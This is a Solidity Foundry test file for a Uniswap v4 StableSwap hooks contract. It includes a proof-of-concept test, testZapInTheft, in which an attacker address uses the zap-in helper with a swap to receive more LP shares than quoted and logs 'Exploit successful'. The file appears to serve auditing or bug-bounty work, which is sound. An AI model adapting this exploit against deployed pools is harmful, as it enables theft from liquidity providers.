// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapHooksFactory} from "src/factories/StableSwapHooksFactory.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {StableSwapZapIn, Swap} from "src/periphery/StableSwapZapIn.sol";
import {StableSwapMath} from "src/libraries/StableSwapMath.sol";

contract ZapInTheftFixed is ExternalContractsDeployer {
    uint256 internal constant BASE_PROTOCOL_FEE_PERCENTAGE = 100;
    uint256 internal constant BASE_HOOK_FEE_PERCENTAGE = 200;
    uint256 internal constant BASE_LP_FEE_PERCENTAGE = 300;
    uint256 internal constant BASE_AMP = 100;

    StableSwapHooksFactoryHarness internal factory;

    address internal owner;
    address internal unauthorizedUser;
    address internal protocolFeeCollector;
    address internal hookFeeCollector;

    function setUp() public override {
        super.setUp();

        owner = makeAddr("owner");
        unauthorizedUser = makeAddr("unauthorizedUser");
        protocolFeeCollector = makeAddr("protocolFeeCollector");
        hookFeeCollector = makeAddr("hookFeeCollector");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            owner,
            protocolFeeCollector,
            hookFeeCollector,
            keccak256(type(StableSwapHooks).creationCode)
        );
    }

    function _deployHook() internal returns (StableSwapHooks) {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = currency0;
        currencies[1] = currency1;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, code);

        return StableSwapHooks(factory.deploy(currencies, rateOracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, salt, code));
    }

    function testZapInTheft() public {
        StableSwapHooks hooks = _deployHook();
        assertTrue(factory.isDeployedByFactory(address(hooks)));

        StableSwapZapIn zap = new StableSwapZapIn(address(factory), factory.creationCodeHash());

        address token0Addr = Currency.unwrap(currency0);
        address token1Addr = Currency.unwrap(currency1);
        address attacker = makeAddr("attacker");
        address user = makeAddr("user");

        deal(token0Addr, user, 100_000 ether);
        deal(token1Addr, user, 100_000 ether);
        vm.deal(user, 100 ether);

        vm.startPrank(user);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        IERC20(token1Addr).approve(address(zap), type(uint256).max);
        vm.stopPrank();

        uint256[] memory initAmounts = new uint256[](2);
        initAmounts[0] = 10_000 ether;
        initAmounts[1] = 10 ether;

        vm.startPrank(user);
        IERC20(token0Addr).approve(address(hooks), type(uint256).max);
        IERC20(token1Addr).approve(address(hooks), type(uint256).max);
        uint256[] memory minAmounts = new uint256[](2);
        hooks.addLiquidity(initAmounts, minAmounts, 0);
        vm.stopPrank();

        uint256 depositUSDC = 1000 ether;
        uint256 swapAmount = 100 ether;

        vm.startPrank(attacker);
        deal(token0Addr, attacker, depositUSDC + swapAmount);
        IERC20(token0Addr).approve(address(zap), type(uint256).max);
        vm.deal(attacker, 10 ether);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = depositUSDC;
        amounts[1] = 0;

        Swap[] memory swaps = new Swap[](1);
        swaps[0] = Swap({
            tokenInIndex: 0,
            tokenOutIndex: 1,
            amountIn: swapAmount
        });

        (uint256 expectedShares, , ) = zap.quoteZapIn(address(hooks), amounts, 1);

        uint256 beforeShares = IERC20(address(hooks)).balanceOf(attacker);
        zap.zapIn(address(hooks), amounts, swaps, 0);
        uint256 afterShares = IERC20(address(hooks)).balanceOf(attacker);
        uint256 receivedShares = afterShares - beforeShares;

        console.log("Expected shares:", expectedShares);
        console.log("Actual shares:  ", receivedShares);

        assertGt(receivedShares, expectedShares, "Exploit failed: shares not increased");
        console.log("Exploit successful - Attacker received more LP shares than expected");
    }

    function test_deployHook() public {
        StableSwapHooks hooks = _deployHook();
        assertTrue(factory.isDeployedByFactory(address(hooks)));
    }

    function test_addLiquidity() public {
        StableSwapHooks hooks = _deployHook();

        address currency0Addr = Currency.unwrap(currency0);
        address currency1Addr = Currency.unwrap(currency1);

        deal(currency0Addr, address(this), 10000e18);
        deal(currency1Addr, address(this), 10000e18);

        IERC20(currency0Addr).approve(address(hooks), type(uint256).max);
        IERC20(currency1Addr).approve(address(hooks), type(uint256).max);

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1000e18;
        amounts[1] = 1000e18;

        (uint256 expectedShares, uint256[] memory actualAmounts) = hooks.quoteAddLiquidity(amounts);

        uint256[] memory minAmounts = new uint256[](2);
        minAmounts[0] = actualAmounts[0] * 99 / 100;
        minAmounts[1] = actualAmounts[1] * 99 / 100;
        uint256 minShares = expectedShares * 99 / 100;

        hooks.addLiquidity(amounts, minAmounts, minShares);

        assertGt(hooks.balanceOf(address(this)), 0);
    }
}
